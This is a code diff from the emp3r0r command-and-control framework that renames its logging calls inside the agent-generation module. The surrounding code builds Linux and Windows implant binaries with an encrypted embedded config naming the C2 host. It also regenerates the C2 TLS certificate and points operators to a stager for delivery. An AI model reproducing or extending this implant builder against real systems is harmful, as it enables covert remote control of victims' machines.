@@ -69,20 +69,20 @@ func modGenAgent() {
 	stubFile := ""
 	payloadTypeOpt, ok := CurrentModuleOptions["payload_type"]
 	if !ok {
-		CliPrintError("Option 'type' not found")
+		LogError("Option 'type' not found")
 		return
 	}
 	payload_type := payloadTypeOpt.Val
 
 	archOpt, ok := CurrentModuleOptions["arch"]
 	if !ok {
-		CliPrintError("Option 'arch' not found")
+		LogError("Option 'arch' not found")
 		return
 	}
 	arch_choice = archOpt.Val
 
 	if !isArchValid(payload_type, arch_choice) {
-		CliPrintError("Invalid arch choice")
+		LogError("Invalid arch choice")
 		return
 	}
 
@@ -90,27 +90,27 @@ func modGenAgent() {
 
 	// is this stub file available?
 	if !util.IsExist(stubFile) {
-		CliPrintError("%s not found, build it first", stubFile)
+		LogError("%s not found, build it first", stubFile)
 		return
 	}
 
 	// fill emp3r0r.json
 	if err := MakeConfig(); err != nil {
-		CliPrintError("Failed to configure agent: %v", err)
+		LogError("Failed to configure agent: %v", err)
 		return
 	}
 
 	// read and encrypt config file
 	encryptedJSONBytes, err := readAndEncryptConfig()
 	if err != nil {
-		CliPrintError("Failed to encrypt %s: %v", EmpConfigFile, err)
+		LogError("Failed to encrypt %s: %v", EmpConfigFile, err)
 		return
 	}
 
 	// read stub file
 	toWrite, err := os.ReadFile(stubFile)
 	if err != nil {
-		CliPrintError("Read stub: %v", err)
+		LogError("Read stub: %v", err)
 		return
 	}
 	sep := bytes.Repeat(emp3r0r_def.OneTimeMagicBytes, 2)
@@ -123,7 +123,7 @@ func modGenAgent() {
 		// pad with 0x00
 		config_payload = append(config_payload, bytes.Repeat([]byte{0x00}, len(emp3r0r_def.AgentConfig)-len(config_payload))...)
 	} else if len(config_payload) > len(emp3r0r_def.AgentConfig) {
-		CliPrintError("Config payload is too large, %d bytes, max %d bytes", len(config_payload), len(emp3r0r_def.AgentConfig))
+		LogError("Config payload is too large, %d bytes, max %d bytes", len(config_payload), len(emp3r0r_def.AgentConfig))
 		return
 	}
 	// fill in
@@ -134,24 +134,24 @@ func modGenAgent() {
 		1)
 	// verify
 	if !bytes.Contains(toWrite, config_payload) {
-		CliPrintWarning("Failed to patch %s with config payload, config data not found, append it to the file instead", stubFile)
+		LogWarning("Failed to patch %s with config payload, config data not found, append it to the file instead", stubFile)
 		// append config to the end of the file
 		err = appendConfigToPayload(stubFile, sep, encryptedJSONBytes)
 		if err != nil {
-			CliPrintError("Failed to append config to payload: %v", err)
+			LogError("Failed to append config to payload: %v", err)
 			return
 		}
 	}
 	// write
 	if err = os.WriteFile(outfile, toWrite, 0o755); err != nil {
-		CliPrintError("Save agent binary %s: %v", outfile, err)
+		LogError("Save agent binary %s: %v", outfile, err)
 		return
 	}
 
 	// done
-	CliPrintSuccess("Generated %s from %s and %s, you can run %s on arbitrary target",
+	LogSuccess("Generated %s from %s and %s, you can run %s on arbitrary target",
 		outfile, stubFile, EmpConfigFile, outfile)
-	CliPrintDebug("OneTimeMagicBytes is %x", emp3r0r_def.OneTimeMagicBytes)
+	LogDebug("OneTimeMagicBytes is %x", emp3r0r_def.OneTimeMagicBytes)
 
 	if payload_type == PayloadTypeWindowsExecutable {
 		// generate shellcode for the agent binary
@@ -159,7 +159,7 @@ func modGenAgent() {
 	}
 	if payload_type == PayloadTypeLinuxExecutable {
 		// tell user to use shared library stager
-		CliPrint("Use `stager` module to create a shared library that delivers the agent with encryption and compression. You will need another stager to load the shared library.")
+		LogMsg("Use `stager` module to create a shared library that delivers the agent with encryption and compression. You will need another stager to load the shared library.")
 	}
 }
 
@@ -186,31 +186,31 @@ func isArchValid(payload_type, arch_choice string) bool {
 func generateFilePaths(payload_type, arch_choice string, now time.Time) (stubFile, outfile string) {
 	switch payload_type {
 	case PayloadTypeLinuxExecutable:
-		CliPrintInfo("You chose Linux Executable")
+		LogInfo("You chose Linux Executable")
 		stubFile = fmt.Sprintf("stub-%s", arch_choice)
 		outfile = fmt.Sprintf("%s/agent_linux_%s_%d-%d-%d_%d-%d-%d",
 			EmpWorkSpace, arch_choice,
 			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
 	case PayloadTypeWindowsExecutable:
-		CliPrintInfo("You chose Windows Executable")
+		LogInfo("You chose Windows Executable")
 		stubFile = fmt.Sprintf("stub-win-%s", arch_choice)
 		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.exe",
 			EmpWorkSpace, arch_choice,
 			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
 	case PayloadTypeWindowsDLL:
-		CliPrintInfo("You chose Windows DLL")
+		LogInfo("You chose Windows DLL")
 		stubFile = fmt.Sprintf("stub-win-%s.dll", arch_choice)
 		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.dll",
 			EmpWorkSpace, arch_choice,
 			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
 	case PayloadTypeLinuxSO:
-		CliPrintInfo("You chose Linux SO")
+		LogInfo("You chose Linux SO")
 		stubFile = fmt.Sprintf("stub-%s.so", arch_choice)
 		outfile = fmt.Sprintf("%s/agent_linux_so_%s_%d-%d-%d_%d-%d-%d.so",
 			EmpWorkSpace, arch_choice,
 			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
 	default:
-		CliPrintError("Unsupported: %s", payload_type)
+		LogError("Unsupported: %s", payload_type)
 	}
 	return
 }
@@ -256,22 +256,22 @@ func MakeConfig() (err error) {
 		config_map map[string]interface{}
 	)
 	if util.IsExist(EmpConfigFile) {
-		CliPrintInfo("Reading config from existing %s", EmpConfigFile)
+		LogInfo("Reading config from existing %s", EmpConfigFile)
 		jsonData, err = os.ReadFile(EmpConfigFile)
 		if err != nil {
-			CliPrintWarning("failed to read %s: %v", EmpConfigFile, err)
+			LogWarning("failed to read %s: %v", EmpConfigFile, err)
 		}
 		// load to map
 		err = json.Unmarshal(jsonData, &config_map)
 		if err != nil {
-			CliPrintWarning("Parsing existing %s: %v", EmpConfigFile, err)
+			LogWarning("Parsing existing %s: %v", EmpConfigFile, err)
 		}
 	}
 
 	// CC names and certs
 	ccHostOpt, ok := CurrentModuleOptions["cc_host"]
 	if !ok {
-		CliPrintError("Option 'cc_host' not found")
+		LogError("Option 'cc_host' not found")
 		return fmt.Errorf("option 'cc_host' not found")
 	}
 	RuntimeConfig.CCHost = ccHostOpt.Val
@@ -286,7 +286,7 @@ func MakeConfig() (err error) {
 	}
 	// if user is requesting a new server name, server cert needs to be re-generated
 	if !exists {
-		CliPrintWarning("Name '%s' is not covered by our server cert, re-generating",
+		LogWarning("Name '%s' is not covered by our server cert, re-generating",
 			RuntimeConfig.CCHost)
 		cc_hosts = append(cc_hosts, RuntimeConfig.CCHost) // append new name
 		// remove old certs
@@ -298,17 +298,17 @@ func MakeConfig() (err error) {
 		}
 		err = EmpTLSServer.Shutdown(EmpTLSServerCtx)
 		if err != nil {
-			CliPrintError("%v. You will need to restart emp3r0r C2 server to apply name '%s'",
+			LogError("%v. You will need to restart emp3r0r C2 server to apply name '%s'",
 				err, RuntimeConfig.CCHost)
 		} else {
-			CliPrintWarning("Restarting C2 TLS service at port %s to apply new server cert", RuntimeConfig.CCPort)
+			LogWarning("Restarting C2 TLS service at port %s to apply new server cert", RuntimeConfig.CCPort)
 
 			c2_names := tun.NamesInCert(ServerCrtFile)
 			if len(c2_names) <= 0 {
-				CliFatalError("C2 has no names?")
+				LogFatal("C2 has no names?")
 			}
 			name_list := strings.Join(c2_names, ", ")
-			CliPrintInfo("Updated C2 server names: %s", name_list)
+			LogInfo("Updated C2 server names: %s", name_list)
 			go TLSServer()
 		}
 	}
@@ -316,25 +316,25 @@ func MakeConfig() (err error) {
 	// CC indicator
 	ccIndicatorOpt, ok := CurrentModuleOptions["cc_indicator"]
 	if !ok {
-		CliPrintError("Option 'cc_indicator' not found")
+		LogError("Option 'cc_indicator' not found")
 		return fmt.Errorf("option 'cc_indicator' not found")
 	}
 	RuntimeConfig.CCIndicator = ccIndicatorOpt.Val
 
 	indicatorTextOpt, ok := CurrentModuleOptions["indicator_text"]
 	if !ok {
-		CliPrintError("Option 'indicator_text' not found")
+		LogError("Option 'indicator_text' not found")
 		return fmt.Errorf("option 'indicator_text' not found")
 	}
 	RuntimeConfig.CCIndicatorText = indicatorTextOpt.Val
 	if RuntimeConfig.CCIndicatorText != "" {
-		CliMsg("Remember to put text %s in your indicator (%s) response",
+		LogMsg("Remember to put text %s in your indicator (%s) response",
 			strconv.Quote(RuntimeConfig.CCIndicatorText), RuntimeConfig.CCIndicator)
 	}
 
 	ncsiOpt, ok := CurrentModuleOptions["ncsi"]
 	if !ok {
-		CliPrintError("Option 'ncsi' not found")
+		LogError("Option 'ncsi' not found")
 		return fmt.Errorf("option 'ncsi' not found")
 	}
 	if ncsiOpt.Val == "on" {
@@ -354,7 +354,7 @@ func MakeConfig() (err error) {
 	RuntimeConfig.C2TransportProxy = CurrentModuleOptions["c2transport_proxy"].Val
 	RuntimeConfig.AutoProxyTimeout, err = strconv.Atoi(CurrentModuleOptions["autoproxy_timeout"].Val)
 	if err != nil {
-		CliPrintWarning("Parsing autoproxy_timeout: %v. Setting to 0.", err)
+		LogWarning("Parsing autoproxy_timeout: %v. Setting to 0.", err)
 		RuntimeConfig.AutoProxyTimeout = 0
 	}
 	RuntimeConfig.DoHServer = CurrentModuleOptions["doh_server"].Val
